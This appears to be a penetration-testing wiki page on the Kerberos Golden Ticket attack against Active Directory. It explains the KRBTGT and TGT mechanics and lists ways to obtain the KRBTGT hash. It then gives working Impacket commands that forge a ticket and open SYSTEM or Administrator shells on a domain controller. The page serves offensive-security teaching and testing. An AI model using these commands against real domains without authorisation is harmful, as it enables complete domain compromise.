# Golden Ticket

## Attack Description

In an Active Directory domain, every domain controller runs a KDC (Kerberos Distribution Center) service that processes all requests for tickets to Kerberos. Each Active Directory domain has an associated KRBTGT account that is used to encrypt and sign all Kerberos tickets for the domain. The KRBTGT account is a local default account that acts as a service account for the KDC service.

Windows Server Kerberos authentication is achieved by the use of a special Kerberos Ticket-Granting Ticket (TGT) enciphered with a symmetric key. This key is derived from the password of the server or service to which access is requested. The TGT password of the KRBTGT account is known only by the Kerberos service. In order to request a session ticket, the TGT must be presented to the KDC. The TGT is issued to the Kerberos client from the KDC.

The Ticket-Granting Service (TGS) issues tickets for admission to computers in its own domain or for admission to the TGS in another domain. When clients want access to a computer, they contact the ticket-granting service in the target computer's domain, present a TGT, and ask for a ticket to the computer. The ticket can be reused until it expires, but the first access to any computer always requires a trip to the ticket-granting service in the target computer's account domain. A TGS exchange is initiated when a client sends the KDC a KRB\_TGS\_REQ message.

A Golden Ticket is a forged TGT that is created using the KRBTGT account password hash. Since the TGT is encrypted/signed by the domain’s KRBTGT account, it is trusted by default by all computers in the domain. With the Golden ticket, an attacker can impersonate any user and access any resource in the domain.

Below is a diagram which shows the process used to obtain access to a resource on the domain using a Golden Ticket:

![Source: https://adsecurity.org/?p=1515](../../.gitbook/assets/kerberos\_goldenticket1.JPG)

## Attack Requirements

&#x20;In order to complete this attack, we need to do the following, and so any tool that can assist with providing the following functionality can be used:

* Gain access to the domain KRBTGT Account NTLM password hash
* Find the Domain Name
* Find the Domain SID
* A username to impersonate

## Attack Tools

The list of tools below contains some of the tools that can be used for this attack. Note that some of the listed tools do the same thing, and so it's down to user preference as to which tools are used.

### Tools:

ticketer.py (Impacket) --> Creates Kerberos golden/silver tickets

psexec.py (Impacket) --> PSEXEC like functionality example using RemComSvc

wmiexec.py (Impacket) --> Executes a semi-interactive shell using Windows Management Instrumentation

mimikatz -->&#x20;

## Attack Example

### Discovery

This article assumes that we already have the KRBTGT hashes, which can be ontained via the following methods:

* DCSync (Mimikatz)&#x20;
* LSA (Mimikatz)&#x20;
* Hashdump (Meterpreter)&#x20;
* NTDS.DIT&#x20;
* DCSync (Kiwi)

Get the domain name and domain SID:

```
Get-ADDomain
```

### Exploit with Impacket

Use ticketer.py to generate the forged ticket:

```
ticketer.py -nthash 555cd976cc897e603aad3a55d15691a6 -domain-sid S-1-5-21-9572663084-452016999-1251370121 -domain testdomain.local Administrator
```

Add the ticket as an environment variable as per the options for psexec.py/wmiexec.py:

```
export KRB5CCNAME=Administrator.ccache
```

Connect to the target DC using the forged ticket:

psexec.py:

> This will get you SYSTEM on the target

```
psexec.py testdomain.local/Administrator@dc1.testdomain.local -k -no-pass
```

wmiexec.py:

> This will get you Administrator on the target

```
wmiexec.py testdomain.local/Administrator@dc1.testdomain.local -k -no-pass
```

### Exploit with Mimikatz

To be added...



## References

{% embed url="https://attack.mitre.org/techniques/T1558/001" %}

{% embed url="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/e720dd17-0703-4ce4-ab66-7ccf2d72c579" %}

{% embed url="https://pentestlab.blog/tag/krbtgt" %}

{% embed url="https://adsecurity.org/?p=483" %}

{% embed url="https://adsecurity.org/?p=1515" %}
